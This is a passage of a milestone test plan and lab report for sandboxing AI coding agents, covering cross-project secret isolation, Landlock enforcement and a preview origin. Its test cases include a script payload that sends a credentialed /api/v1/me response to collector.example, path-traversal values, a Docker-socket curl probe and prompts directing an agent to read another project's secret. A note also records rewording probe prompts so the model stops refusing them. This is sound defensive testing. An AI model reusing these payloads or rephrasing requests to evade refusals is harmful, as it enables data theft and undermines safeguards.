| SeaweedFS S3 gateway `chrislusf/seaweedfs:4.48` under the optional profile `s3`, no published port, named volume `seaweedfs` — **landed in `compose.yml`** | `compose.yml` | ADR-0020 D7 as updated by the owner's "no paid storage" decision: an Apache-2.0 S3 speaker for the conformance suite, invisible to `docker compose up` without `--profile s3`. Proven only to start and answer its S3 endpoint; `internal/artifacts/s3` still does not exist, and D-014 stays **Proposed** |
| `COMMUNICATION_ARTIFACT_ROOT`, `COMMUNICATION_SECRET_KEYRING`, `COMMUNICATION_SANDBOX_ENFORCEMENT`, `COMMUNICATION_PREVIEW_BASE_URL`, `COMMUNICATION_PREVIEW_TOKEN_SECRET`, `COMMUNICATION_ARTIFACT_BACKEND`, `COMMUNICATION_ARTIFACT_S3_ENDPOINT`, `COMMUNICATION_ARTIFACT_S3_BUCKET`, `COMMUNICATION_REPOS_ROOT` | worker + serve env | the above, configurable, with `disabled`/`permissive-dev` reachable only by explicit admin configuration (`05`). `COMMUNICATION_REPOS_ROOT` names the second storage root whose identity `worker_volumes` measures separately; the S3 pair is inert while `ARTIFACT_BACKEND=local`, which is the default |
| Caddy: a second vhost `preview.localhost:18084` routing only `/preview/*`, app origin 404s everything else | `api/Caddyfile` | ADR-0020 D6; a *hostname* difference is what removes the cookie (a port would not) |
| `worker/Dockerfile`: keep `USER worker` uid 10001; `compose.harness.yml` keeps `HOST_UID`/`HOST_GID` and adds `nono` capability notes | as today | ADR-0019 D4; the observed `Authentication required` failure (ACP.md) was an unreachable-credential uid bug, and `required` must fail the same honest way |

## 6. M3 exit test plan

Lab: `docker compose -p communication -f compose.yml -f compose.harness.yml up -d --build`
(`HOST_UID=$(id -u) HOST_GID=$(id -g)`), stack at `http://localhost:18080`, preview origin
`http://preview.localhost:18084`, both API replicas + worker + `postgres:18.6`. The disposable
repositories are **local paths** (`file:///srv/m3/fixtures/{frontend,backend}.git`) — no credentials,
no network, no GitHub app (AGENTS.md: no secrets in fixtures). Every scripted check below is a shell
command whose literal output goes into the M3 acceptance report; `12-test-strategy.md`'s rule applies
verbatim: a mocked green unit test never substitutes for these.

### Setup script (`docs/compatibility/probes/m3/run.sh`, to be written as M3's first task)

```bash
S1  # fixtures: two repos, backend has app.py + tests; frontend has index.html
S2  # PROJECT A (member: alice=contributor, bob=viewer) — repos frontend+backend, profile "Claude Code"
S3  # PROJECT B (member: carol only) — repo backend-b, one workspace, one conversation, never touched
S4  # project A secret:  POST /api/v1/projects/A/secrets
    #   {slug: "test-database-url", purpose: "m3-exit", delivery_mode: "env_file",
    #    allowed_agent_profile_ids: [<claude profile>],
    #    value: "SENTINEL-m3-9f4c2a1b-database_url-for_exit_test_only"}
S5  # project A mount: {secret: test-database-url, mode: env_file, repository: backend,
    #   relative_path: .env.test.local, key: DATABASE_URL, lifecycle: turn}
S6  # project B secret + mount at the SAME relative_path, value SENTINEL-B-… — so a cross-project
    #   read that succeeded would print a value project A must never see
S7  # worker: sandbox_enforcement=required, artifact_backend=local, nono pinned
S8  # communication doctor (host and inside the worker container) → capture kernel, landlock-lsm,
    #   nono version, isolation verdict, forbidden capabilities, run-user id  → 05's first gate
```

### Case 13 — enforcement unavailable ⇒ no process, visible reason

```bash
C13a  docker compose exec worker communication doctor --sandbox-policy-dry-run   # → N-a…N-d verdict
C13b  # force it: run a throwaway worker container whose seccomp profile blocks the three
        #   landlock syscalls, so the probe really fails (NOT --security-opt seccomp=unconfined,
        #   which would do the opposite):
        docker run --rm --security-opt seccomp=prof/landlock-blocked.json … communication worker
C13c  POST a turn on a `required` profile in that container → HTTP 202 (turn queued), then:
        psql -c "select type,payload from domain_events where type='sandbox.enforcement_failed' 
                  order by global_seq desc limit 1"
        # expect: stage ∈ {probe,profile,policy_assert}, reason ∈ {landlock_unavailable,fs_unverified,
        #         af_unix_not_mediated,…}, verified=false, child_started=false
C13d  psql -c "select status,stop_reason from conversation_turns order by created_at desc limit 1"
        # expect: failed, stop_reason NULL, and the turn's failure reason = sandbox_enforcement_failed
C13e  docker compose logs worker | grep -ci "claude-agent-acp"   # expect 0: nothing ever exec'd
C13f  NEGATIVE CONTROL (the FC2 lesson): patch nothing, but assert `--sandbox-policy landlock` in the
        argv the worker logged, and that a policy requesting `external` is refused with
        reason=policy_delegation_refused
```

*Honesty note to carry into the report:* C13b is the branch SANDBOX.md/ADR-0009 list as **never
observed** ("no way to disable Landlock without sudo"). A seccomp profile blocking
`landlock_create_ruleset`/`landlock_add_rule`/`landlock_restrict_self` is the way to observe it
without sudo-in-the-test; if it cannot be made to work on this host, the case is reported **GAP**, not
PASS, and `required` keeps its GAP label exactly as ADR-0009's Migration section demands.

### Case 12 — `.env` exists only during the authorized unit, and nowhere else

```bash
C12a  # during the turn (worker writes its own observation to meta/, polled by the script):
      docker compose exec worker sh -c 'test -e \
        /workspaces/conversation/$CONV_ID/work/repos/backend/.env.test.local && stat -c "%a %U" …'
        # expect: 600 <worker uid>
C12b  … and the sibling project's file is NOT there:
      docker compose exec worker sh -c 'test -e /workspaces/conversation/$B_CONV_ID/work/repos/backend-b/.env.test.local; echo $?'  # 1
C12c  # git absence, measured inside the workspace during the turn:
      docker compose exec worker git -C …/work/repos/backend status --porcelain      # no `.env.test.local` line
      docker compose exec worker git -C …/work/repos/backend ls-files .env.test.local # empty
      docker compose exec worker git -C …/work/repos/backend diff -- .env.test.local  # empty
C12d  # after the turn:
      test -e …/.env.test.local; echo $?                                         # 1
      psql -c "select type,payload->>'target' from domain_events where type in
               ('secret.materialized','secret.removed') order by global_seq"
      psql -c "select cleaned_at is not null, cleaned_by from secret_materializations order by id desc limit 1"  # t | worker
C12e  # absent from OUTPUTS: grep the whole journal for the sentinel (zero rows), and audit detail:
      psql -tAc "select count(*) from domain_events where payload::text like '%SENTINEL-m3-9f4c2a1b%'"   # 0
      psql -tAc "select count(*) from audit_events  where detail::text  like '%SENTINEL-m3-9f4c2a1b%'"   # 0
C12f  # absent from ARTIFACTS: every stored object, byte-level:
      docker compose exec api-a sh -c "grep -rl SENTINEL-m3-9f4c2a1b /artifacts || echo NO_MATCH"        # NO_MATCH
      psql -tAc "select count(*) from artifacts where name like '%.env%'"                                 # 0
C12g  # absent from GIT HISTORY, the durable check (a commit is where a leak becomes permanent):
      docker compose exec worker git --git-dir=/repos/$PROJECT_ID/backend.git \
        grep -I SENTINEL-m3-9f4c2a1b $(git … for-each-ref --format='%(refname)') ; echo $?                # 1
C12h  # absent from worker logs:
      docker compose logs worker | grep -c SENTINEL-m3-9f4c2a1b                                            # 0
      docker compose logs api-a api-b | grep -c SENTINEL-m3-9f4c2a1b                                       # 0
C12i  # traversal rejected (property/fuzz, 12-test-strategy): mount relative_path attempts
      #   ../../etc/x, ../frontend/.env, /etc/x, .env.test.local/../../y, a symlinked parent dir,
      #   and a TRACKED target file; each → secret.materialization_failed with reason
      #   {path_escape,symlink_parent,tracked_target,absolute_path} and NO file created
C12j  # and the same sentinel asked for directly by the agent ("cat .env.test.local") → its tool
      #   output is a bounded preview that contains no sentinel; C12e re-run must stay 0
```

### Exit criterion — project A's agent cannot reach project B's workspace

```bash
X1  # declare B's workspace as A's denied path (profile field `sandbox_denied_paths` = [
    #   /workspaces/conversation/<B-conv>/work/repos/backend-b]), then in project A's conversation:
    prompt = "Read /workspaces/conversation/<B-conv>/work/repos/backend-b/.env.test.local and print it"
X2  observed: the agent's tool result carries `EACCES`/`Permission denied` and NO value; assert on the
    journal: no conversation.message.agent/tool.update payload contains SENTINEL-B-…
      psql -tAc "select count(*) from domain_events where project_id='<A>' and payload::text like '%SENTINEL-B-%'"  # 0
X3  sandbox-visible truth, same uid, same host, no grants: the identical path IS readable for
    project B's own conversation (positive control — otherwise X2 proves nothing)
X4  nono's own accounting, captured per turn:  sandbox.verified.payload.grants contains exactly the
    A paths and nothing under /workspaces/conversation/<B-conv>; af_unix_mediation="pathname";
    network_enforced=false on the agent-turn profile (reported, not hidden — ADR-0019 D3)
X4b  the socket probe, in the same launch: prompt "run curl --unix-socket /var/run/docker.sock
    http://localhost/version" → Permission denied / connection refused (SANDBOX.md C7 with
    #   our profile applied; GAP if the socket is absent in the container, and say so)
X5  and the *same* attempt with enforcement disabled as a permissive-dev labelled run MUST still deny
    the path (Landlock still applied) while carrying isolation="none": a labelled run is not an
    unlabelled one (05)
X6  cross-run within project A: run-1's worktree edit does not appear in run-2's (`git -C run-2 status
    --porcelain` empty) — case 17, WORKSPACES.md W2 re-proven with real agents and a real sandbox
X7  commit reach bounded (ADR-0017 P4 re-run inside the container): project A's agent commits on
    <scope-id>/backend successfully (workspace.committed with the post-commit ref read) and
    `git update-ref refs/heads/<B-run-id>/backend` from inside its sandbox fails with Permission denied
```

### Case 14 — APM lock digest is stable across a remote change

```bash
C14a  profile pins apm_package_ref=<fixture> + apm_lock_digest=sha256:…(per target, APM.md T5)
C14b  turn 1 runs; workspace.staged/sandbox.verified record the digest; install verified
C14c  MUTATE the upstream APM source: add a skill + bump its content (a real local-path change, and
      the git-source variant if the fixture can serve `git uploadpack` without credentials)
C14d  turn 2 on the SAME profile revision → `apm install --frozen` reproduces the SAME tree; assert
      sha256(apm.lock.yaml) on disk equals the recorded digest, and no new package content appears
C14e  and the refusal path: point the profile at a lockfile whose digest differs → the worker refuses
      to launch with a visible digest-mismatch failure rather than silently restaging (ADR-0008 D4)
```

### Case 15 — non-member probing everything, no metadata leak

```bash
C15a  carol (Project B only) as user `carol` via mock-oauth2-server, driving the LB:
C15b  GET /api/v1/projects/A{,/repos,/members,/secrets,/secret-mounts,/workspaces,/artifacts},
      GET /api/v1/secrets/{A's id}, …/materializations, GET /api/v1/workspaces/{A's},
      GET /api/v1/turns/{A's}/sandbox, GET /api/v1/artifacts/{A's}{,/content},
      POST /api/v1/artifacts/{A's}/preview-token, GET /projects/A/events (SSE, with a Last-Event-ID
      stolen from carol's own project), GET the preview URL from a token carol never minted
      → every one 404 application/problem+json; SSE never opens
C15c  psql -tAc "select action,outcome from audit_events where actor_id='<carol>' order by id"
      → every probe recorded outcome='denied'
C15d  body-equality check: carol's 404 bodies are byte-identical to a random-uuid 404 bodies
      (existence is project-scoped information, ADR-0014 §3)
C15e  and bob (Project A **viewer**) must NOT see restricted artifacts or any secret value: the
      sensitivity table (ADR-0020 D3) is enforced in SQL, proven by bob's 403/404 on /content
C15f  assistant search is **not** part of this case in M3 — there is no assistant surface yet
      (`11-build-roadmap.md` puts it in M7), so case 15 is reported as proven for API/SSE/artifact and
      **deferred** for assistant search, with the authz rule it must inherit already fixed here:
      assistant tools share the backend's authorization, and every search query carries the same
      project predicate as the routes above (D-023, `09`).
```

### Case 16 — HTML artifact with a script payload, in the sandboxed viewer

```bash
C16a  plant the artifact: the agent is prompted to write report.html containing
      <script>fetch('/api/v1/me',{credentials:'include'}).then(r=>r.text())
       .then(t=>fetch('https://collector.example/'+encodeURIComponent(t)));</script>
      plus <img src="http://localhost:18080/api/v1/me"> and a localStorage access attempt
C16b  publish it as an artifact; assert media_type=text/html, sensitivity=standard, artifact.created
C16c  server-side header checks:
      curl -sD- "http://localhost:18080/api/v1/artifacts/$ID/content" | head -8
        # Content-Type: text/plain; charset=utf-8, Content-Disposition: attachment
      curl -sD- "http://preview.localhost:18084/preview/$TOKEN" | head -12
        # Content-Security-Policy: sandbox; default-src 'none'; img-src data: blob:; …
        # X-Content-Type-Options: nosniff, Referrer-Policy: no-referrer, Cache-Control: no-store
C16d  origin isolation:
      curl -s "http://localhost:18084/preview/x"                     # 404 (app origin refuses)
      curl -s "http://preview.localhost:18084/api/v1/me" -H "Cookie: session=…"  # 404, and the
        # API access log line for this request shows NO Cookie header accepted
      docker compose logs api-a | grep 'GET /preview/' | grep -ci 'cookie'        # 0
C16e  token hygiene: expired token → 401 problem+json; token re-signed for another artifact id →
      refused; token used on the app origin → 404
C16f  Playwright leg below (W6)
```

### Case 17 — concurrent multi-repo run isolation

`X6` above plus: two conversations in project A each get a workspace on their own branch
(`workspace.prepared` payloads show distinct `run_ref`s and distinct `volume_id`s), the frontend repo
worktree is present in both from the same mirror, and edits made by conversation 1 (a real Claude
turn) are invisible to conversation 2 (`git -C …/run-2/work/repos/frontend status --porcelain` empty,
`git -C …/run-2/work/repos/frontend log --oneline -1` unchanged) while both are live concurrently — the
WORKSPACES.md W2 shape, but with agents running in parallel rather than sequentially.

### Playwright legs (`pnpm dlx @playwright/cli`, ADR-0006; screenshots stay in .playwright-cli/ and are never committed)

| id | steps | assertions |
|---|---|---|
| W1 | log in as alice → Project A → Settings → Secrets → create `test-database-url` via the masked input, choose `.env` destination, repository `backend`, path `.env.test.local`, lifecycle per-turn (J8) | the value never appears in the DOM (assert `page.content()` has no sentinel); no network frame's *response* contains it; path/permission policy and warnings rendered |
| W2 | open Project A → Repositories/Workspaces widget | repos, base refs, worktree identity, `volume_id`, dirty summary, excluded paths visible; **no absolute host path rendered** |
| W3 | start the turn, watch the project SSE stream | `workspace.prepared`, `secret.materialized`, `sandbox.verified` (or `sandbox.enforcement_failed` in the C13 run) appear live, metadata-only, with the sandbox verdict next to the conversation, not hidden in a tooltip (`10` J7's honesty rule) |
| W4 | Ops page → workers | sandbox backend/version/enforcement/verified rendered for worker-1, plus the pinned nono version; when `verified=false`, the page says so in words that do not imply safety |
| W5 | as carol, open `http://localhost:18080/projects/<A-id>` and `/artifacts`, and deep-link one of A's artifact URLs | 404/"not found" state, no project name, no artifact name, no spinner that later fills in; console has no leaked payload |
| W6 | as alice, open Project A → Artifacts → report.html preview | the preview iframe's `src` host is `preview.localhost:18084`; `page.evaluate` from the app context cannot read `iframe.contentDocument` (SecurityError); the collector request never appears in ANY network log; CDP `Network.getAllCookies` for the preview URL's jar is empty; `document.cookie` inside the preview frame is empty and `localStorage` throws |
| W7 | reload the app mid-turn (API replica roll) and reconnect the stream with `Last-Event-ID` | transcript continuity from M1/M2's mechanism still holds with the new event types in the stream (no gap, no unauthorized event) |
| W8 | kill the worker mid-turn (`docker kill`), restart on the same volume, then on a *different* volume | same-volume: workspace reclaimed (case 20 arm 1, `turn.interrupted` then a fresh turn reusing the workspace); different-volume: `workspace.recovery_lost` with `reason="volume_changed"` and the UI saying "prior edits lost, rerun required" — never "resumed" (J7) |

### Reporting

The M3 acceptance report pastes, per case: the command, the literal output, and the commit/ids it refers
to. `docs/compatibility/SANDBOX.md`, `APM.md`, `WORKSPACES.md` and `ACP.md` each gain the rows this
milestone actually observed — prefilled PASS is forbidden (AGENTS.md), and any row that stays GAP
(the GAP list: rootless Podman, the Landlock-missing kernel branch, enforced egress on a real model
turn, the worker image's own Landlock row until probed) is written as GAP with the reason.

## 7. What § 6 actually observed (first real run, `-p m3sbx`)

Everything below is copied from the lab run, not restated from the plan. Where a
case did **not** get exercised, it says so rather than going quiet.

| Case | Observed |
| --- | --- |
| 13 (refusal, no fallback) | A `required` worker pointed at an unsandboxing `nono` shim exits **2** and writes **zero** `workers` rows: `"msg":"invalid execution-unit configuration","error":"sandbox reports no Landlock filesystem support …: required mode refuses to start"`. `case13-probe rows in workers table: 0` while the real worker reads `worker-1|online`. |
| 13 (per-launch) | `sandbox.verified` rows: **7**; `sandbox.enforcement_failed` rows: **0** — no launch in this run was refused. The refusal path is covered by unit tests against the real binary, not by this run. |
| 15 (secret survives cleanup) | Not exercised: no secrets were configured in this stack (`SecretMaterializer` is nil). Covered by `TestUnitSecretLeftBehindQuarantines` with a genuinely undeletable file (read-only parent dir). |
| 18 (cross-project denial) | From inside the worker container, with B's mirror granted and A's not: `DENIED: B cannot read A mirror`, `DENIED: B cannot write A mirror`, disk-corroborated (`no pwned file exists in A`), positive control `ALLOWED: A reads its own mirror`. |
| C-CWD (cwd must be granted) | Every leg initially failed with `nono: CWD access requires --allow-cwd in non-interactive mode` until the probe cd'd into the grant — the rule reproducing itself against the tester is the strongest form of this evidence. |
| C-FC3 (silent grant drop) | `nono run -v --dry-run` on a nonexistent path: `WARN '/repos/DOES-NOT-EXIST' does not exist and will be ignored.` / `INFO Skipping non-existent path:` — and then **`CHILD-RAN`**. This is why N-d asserts set equality and why every grant path is stat-ed before launch. |
| D4/D23 (`/tmp`) | Without `-p`: `/tmp WRITABLE (default profile grants it: C-TMP1)`. With the shipped profile: `DENIED: /tmp not writable` + `/usr/bin/sh: 1: cannot create /tmp/m3-b: Permission denied`. Agent temp under its grant: works — `claude-1000` and `probe` exist in `<scratch>/tmp`. |
| Volume identity | Both roots recorded per prepare (`worker_volumes` rows for `workspaces` and `repos`), asserted in `TestUnitPrepareRecordsBothVolumes`. |
| Commit axis (ADR-0017 D4/D8) | A sandboxed agent committed under `required` to its **own** run ref: `refs/heads/01a13eaa-bf85-…/projA → 464ecb68`, `git log -1` = `Communication Worker <worker@communication.invalid> m3 projA`, and `ls-tree` of that ref contains `MARKER_projA.txt`. The `workspaces`/`workspace_repos` rows read `worktree / released / <scope>/projA / 464ecb68`. |
| Permission axis preserved | projB's agent was blocked at an `ask` prompt, let it expire, and **reported truthfully that it had committed nothing**: `I didn't make the commit, so there's no hash to report.` Its `head_commit` column stayed empty. A turn that lies about its own output would be the worse failure, and it did not happen. |
| Turn two (D22) | The first compose attempt at a second turn failed with `fatal: a branch named '<run-ref>' already exists`; fixed, regression-tested, and the fix verified by reverting it and watching the test reproduce the identical message. |

**Cases § 6 lists that this run did not cover, and why:** profile-rotation stability
across two turns of one conversation (case 14) needs a second completed turn on the
same conversation *with* an APM-pinned profile — no profile in this stack pins a
package, so `apm install` never ran against a real checkout; and the S3 artifact
conformance gate (case 19) is a different worker's slice.

### 7.1 The strengthened exit proof: **ENOENT is not a denial**, and X5 closed

The integrated run on the harness stack (`-p communication`, HEAD `4c0f6ca`,
`run17-FINAL.log`) passed X1–X4, but that X2 accepted "permission **or
no-such-file**" wording, and project A's probe actually printed
`No such file or directory`: B's `.env.test.local` exists only during B's own
turn, and one worker serializes turns, so by the time A's probe ran the file
had already been cleaned up. A denial of a path that does not exist is
observationally identical to no sandbox at all and does not satisfy the exit
criterion. The rule now, enforced in code:

> **A cross-project probe passes only on `Permission denied` (EACCES) naming
> the exact target — for reads and writes. `No such file or directory` on a
> probed target is a FAIL, not a denial.**

The committed exit script — **`e2e/m3/e2e_m3_exit.py`** (+ `e2e/m3/README.md`
for the exact command and prerequisites: the built `compose.yml +
compose.harness.yml` stack, real agent logins, the `.harness` fixtures) —
therefore probes only paths host-verified to exist at the instant of the
probe: B's persistent mirror objects (`/repos/<B>/backend-b.git/HEAD`, `cat`
and `touch`) and B's **live** materialized `.env`, held in place by a
deliberately long B turn and sampled once a second from the host
(`StatWatch`). Co-existence is proven twice over — the wall-clock stat window
and journal interleaving (`conversation.turn.started` < the probe's
`conversation.tool.update` < B's `turn.completed`) — and the probe turns run
on a throwaway *second* `required` worker so the main worker is provably
still holding B's turn at that moment; B's bytes are shown unchanged after
(sha256 of HEAD, directory listing, ref set, and a single file sha across
every live sample).

X5 is no longer a GAP. A throwaway worker container configured
`COMMUNICATION_SANDBOX_ENFORCEMENT=permissive-dev` (its own scratch dirs and
artifact root, removed afterwards; the main stack's worker keeps `required`
and is never reconfigured) runs the same paths, same uid, same image, and
**reads them** — proven with a content-extracted `md5sum < path` equal to the
host-computed md5, so no arm ever puts secret bytes into a journal (SENTINEL-B
is asserted absent from every payload globally, in every arm). One
§ 6 correction this forces: X5's parenthetical "(Landlock still applied)"
does **not** match the implementation — `Unit.Verify` (`internal/worker/unit.go`)
hands `permissive-dev`/`disabled` units a plain plan that bypasses nono
entirely. The mode's honesty is its labelling, not best-effort sandboxing:
the registration row says `permissive-dev`/unverified, the turn's sandbox
view answers `backend=none, verified=false`, and the worker log prints the
mode-ceiling warning. That is exactly what makes the throwaway a valid
negative control, and it changes nothing about `required`, which is where
M3's security claims live (ADR-0019 D6).

Two lab lessons are encoded in the script rather than hidden: probes must
target persistent or host-watched-live paths (see above), and probe prompts
must be plain single commands ("run exactly `cat <path>`, report the FULL
outcome") — exfil-shaped prompts (`echo PWNED >`, "don't look it up another
way", "self-diagnostic harness" framing) get refused by the real model, and
a refused probe FAILs visibly instead of counting as a denial.

## 8. Deviations this contract forces on the spec text

Each of these is caused by M0 evidence, not preference; the ADR that carries it is named.

| # | Spec text | What the evidence forced | ADR |
|---|---|---|---|
| D1 | `05`: workspace is `/var/lib/communication/workspaces/<run-id>/`, and a Run Workspace belongs to a run | M3 has runs and attempts in name only — `00003` created `conversation_turns`, and `attempts` is an M4 bullet. The workspace is scoped by `{conversation,run}` + uuid, with `run_id` left nullable and unpopulated until M4 | 0017 D1/D3 |
| D2 | `05`: `meta/` is "worker-only metadata, never mounted to agent" | git aborts outright when `HOME` is outside the grants (`warning: unable to access '~/.gitconfig': Permission denied` → `fatal: unknown error occurred while reading the configuration files`), and APM writes `~/.apm`. The agent needs a writable HOME **inside** its grants, so it is a sibling `home/` directory, and `meta/` keeps its promise literally | 0017 D1, 0019 D4 (evidence P6, APM.md T4) |
| D3 | `05`: "verify `git ls-files` and check ignore/exclude rules" (per-mount framing) | git ignores a per-worktree `info/exclude`, honors only the shared `<mirror>/info/exclude`, and `extensions.worktreeConfig` — the documented per-worktree route — broke every git command in that layout. Exclusions are therefore **project-scoped**, worker-written, agent-immutable | 0017 D6 (X1/X2/X3/X4) |
| D4 | `05`: a `SandboxPolicy` with `fs_deny` | nono has no CLI deny flag, and Linux `filesystem.deny` is point-in-time anyway; the adapter treats `FSDeny` under `required` as a configuration error and relies on absence-of-grant. Compounding it: `/tmp` is write-granted by nono's always-layered `default` profile, so omission is not a deny there | 0018 (threat model), 0019 D2/D5 (evidence N1/P9) |
| D5 | `05`/`12` case 13 imply one enforcement profile per run | a real Claude/Codex turn cannot answer at all with egress denied (the model API is the product), and domain allowlisting is a userland MITM proxy that was never proven end-to-end | 0019 D3 (two profiles, `network_enforced` reported per event; D-021 stays Provisional) |
| D6 | `05`: three credential kinds, harness auth may be "sensitive directory trees" | the lab's harness directories must stay **rw** mounts (mid-turn writes), so they cannot be per-attempt-isolated by the sandbox; two projects using one launcher share that state. Cross-project denial is proven over workspaces/mirrors, not credentials | 0019 D4 |
| D7 | `02`/`09`: artifact store with "S3-compatible production backend" | M3 ships the local shared-directory backend plus a *written* S3 contract; no S3 implementation. The owner decided **no paid storage**, so the conformance endpoint is **SeaweedFS** (Apache-2.0, `chrislusf/seaweedfs:4.48`, compose profile `s3`, no money, no host port) instead of MinIO (AGPL, and a dependency nobody had signed off). D-014 stays Proposed: the service answering an S3 request is not `internal/artifacts/s3` conforming | 0020 D7 |
| D8 | `09`'s `GET /artifacts/{id}` "signed controlled download" | signing is implemented as an HMAC'd token minted by the API for **both** backends, and preview is a separate **hostname** (not a port, not a path) because cookies are host-scoped | 0020 D5/D6 |
| D9 | `05`: `lifecycle: node_attempt` | the only unit that exists in M3 is the turn; `node_attempt` is accepted by the CHECK and honoured by nothing | 0018 D1 |
| D10 | `04`: `AgentProfileRevision` with `sandbox_policy_ref`, `secret_refs`, `limits`… | there are still no profile revisions (ADR-0016 deferred them), so M3 adds columns to `agent_profiles`; `limits` (resources/CPU/memory) is **not** implemented and is named as unimplemented rather than modeled as a no-op | 0017/0019 (§ 1 columns), 0019 Verification |
| D11 | `05`: "linked worktree or clone", D-008 per-run worktree default | confirmed workable, but the admin directory name is not derivable from the layout (git auto-suffixes `backend`, `backend1`) and git needs reflog directories pre-created; the contract therefore *reads* these paths back instead of constructing them | 0017 D4 (P1/P7) |
| D12 | `12-test-strategy.md` case 16 rendered "in restricted sandboxed viewer" | an `allow-scripts`-less iframe already makes the payload inert, which is a different guarantee than "the script runs but is contained"; M3 proves both the inert case and the direct-navigation case, and self-contained HTML only | 0020 D6 |
| D13 | `05`/ADR-0017 D1: `<workspace>/{repos,scratch,meta,home}`, and ADR-0019 D1 grants `rw <workspace>` | `nono --allow <dir>` is **recursive**, so a workspace-root grant reaches everything under it: probe C-META had the sandboxed child read `meta/workspace.json` *and write* `meta/agent-written` under exactly that shape. `meta/` is therefore a **sibling** of the granted tree — the layout is `<root>/{meta,work}` with `work/{repos,scratch,home}` — and `workspaces.agent_root` is a **generated** column (`root_path \|\| '/work'`) so no writer can record any other shape (`migrate_test.go` asserts supplying it is refused). 05's sentence "`meta/` is worker-only, never mounted to agent" finally holds mechanically | 0017 D1 (as corrected), probe C-META |
| D14 | contract § 3 earlier drafted `sandbox.verified.grants` as the resolved path list, and exit test X4 asserted "grants contains exactly the A paths" | a resolved grant list is a list of absolute host paths, which § 3 forbids in a payload and § 2 forbids in a response — and the journal is streamed to every project member, so the ban cannot stop at the browser. `grants[]` is now `{role, access}` over ADR-0017 D4's nine named roles; X4's check becomes "the roles this workspace's own `workspace_repos` rows imply, and no role resolving outside its scope", which is the same claim read through rows the reader is entitled to | § 2/§ 3 rules, ADR-0019 D5 |
| D15 | contract § 3 earlier drafted `secret.version.added` carrying `content_sha256` | ADR-0018 names that digest "retry-comparison only, never API-exposed", and the journal *is* an API — a digest of a low-entropy secret visible to every project viewer is an offline guessing oracle. The digest stays in `secret_versions` where only the worker's own write transaction reads it | 0018 D2, § 3 |
| D16 | ADR-0017 D2: "the worker resolves the `st_dev` of its workspace root, hashes the device identity plus the root path, and reports it on register as `workers.volume_id`" | the *intent* (registration data that survives a restart and distinguishes a replaced volume) is kept; the mechanism is falsified twice over — probe V3 (two different named volumes at one path share `st_dev`, so a replaced volume would be called the same and lost workspaces reclaimed) and V5b (`/workspaces` and `/repos` measured as one device, two inodes, so one column can only ever name one tree). Identity is therefore `(st_dev, st_ino, root_path)` per root, in `worker_volumes`, with `workspaces.volume_id` and `workspace_repos.mirror_volume_id` recording which identity each path was created under | probes V2/V3/V4/V5/V5b, § 1 |
| D17 | ADR-0017 D1: "`git clone --mirror <url> <repos-root>/<project>/<name>.git`" | a `--mirror` clone sets `remote.origin.mirror=true`, which makes every later `fetch --prune` **delete** refs the platform itself wrote: a second prepare in the same project pruned the first run's `refs/heads/<scope>/<name>`, and the run ref then answered `rev-parse: unknown revision`. D1's own isolation requirement (run refs persist per ADR-0017 D4) cannot coexist with mirror-mode fetch. The mirror is built with `git init --bare --initial-branch=<default>` + `remote add origin` + `remote.origin.fetch = +refs/heads/*:refs/remotes/origin/*` (and `remote.origin.mirror` explicitly unset, because `init --bare` in some git versions leaves it set), so pruning is confined to `refs/remotes/origin/*` and start points read `refs/remotes/origin/<branch>` rather than `refs/heads/<branch>`. The observable contract — one bare per-project clone, shared objects, no worktree linked across projects — is unchanged | probe G9 (observed: `git --git-dir=<mirror> rev-parse <scope>/<name>` → `unknown revision` after a second prepare); `TestMirrorFetchPrunesNothingOfOurs` |
| D18 | ADR-0019 D2's chain assumed the grant set could be asserted from a **profile file** | profile-file grants are tagged `[profile]` and are indistinguishable in `--dry-run` output from rules nono inherits through `extends: default` (observed: `/run/systemd/userdb` appears as `[profile]` with no such entry in ours). N-d's exact-match assertion is therefore not expressible against `[profile]` lines. Grants are passed as **CLI flags** (`--allow`/`--read`, tagged `[user]`), which makes the asserted set exactly the set we named; the static profile carries only what flags cannot: mediation, the Landlock pin, the `system_write_linux` exclusion and the device re-grants that exclusion breaks (C-TMP3) | probes C-FC2/C-FC2b (nono hides the difference between its own defaults and a caller's), C-META3 |
| D19 | ADR-0019 D2's N-d was drafted as "parse the dry-run grant list and compare" | comparison alone would pass on a **superset**: nono layers its `default` profile under every launch, so `/tmp` and friends appear resolved regardless of what was asked (C-TMP1). N-d asserts set **equality** against the resolved `[user]` lines, aborts on any `[user]` grant that was not asked for, and additionally rejects any resolved grant that is a temp path (`RefuseTempPath`) or resolves outside the plan's own scope | probes C-TMP1/C-TMP2, C-ND |
| D20 | § 4.2 step 5 says "verify then exec" | the exec belongs to the ACP runtime, not to the sandbox adapter: `Runtime.Start` owns the stdio pipes that carry ACP frames, so an adapter that exec'd the sandbox would have nowhere to put them and could not be tested without a harness. The adapter therefore *computes* the argv and runs the chain (`Unit.Verify`), and the runtime execs argv[0]=nono. `Launcher.LaunchPlan` (verify + exec) remains for `doctor` and command-mode, where there is no ACP session. The ordering is unchanged; only the process owner is named | § 4.2, ADR-0019 D1 |
| D21 | ADR-0019 D6 requires refusal, and ADR-0009 D2 requires a *verified* backend before `required` may serve | **`Probe` can never return `Verified=true` by construction** — it reports what `nono setup --check-only` claims, and M2 deliberately hardcoded the false with a note ("enforcement proven by sandbox_integration tests"). Using it as the startup gate therefore made `required` mode permanently unstartable, which is how the first compose bring-up failed. The gate is now a real two-legged exec test (`Launcher.SelfTest`): a granted path must be writable *and* a non-granted sibling must not be, with the denied leg's report corroborated by a `stat` so a lying child cannot pass. Its own negative control (`selftest_negative_test.go`, an unsandboxing `nono` shim) fails loudly if the test ever becomes vacuous | observed as `sandbox cannot enforce filesystem isolation (observed filesystem=true verified=false): required mode refuses to start` |
| D22 | § 4.2 step 1's prepare is idempotent per ADR-0017 D3 | idempotency over a *surviving* worktree is not the case that matters. A released workspace **keeps its run refs** (D1: that is what makes a resumed conversation continue from the last commit), so on turn two the branch exists and the worktree does not, and `git worktree add -b <run-ref>` answers `fatal: a branch named '<run-ref>' already exists` — making every resumed conversation permanently unstartable. Prepare now reads `refs/heads/<run-ref>` back and, when present, adds the worktree **on that ref** instead of creating one; the resumed `base_commit` is the previous turn's commit, asserted as a regression test | observed live in `-p m3sbx` on the second turn of one conversation; `TestRePrepareAfterReleaseResumesTheRunRef` |
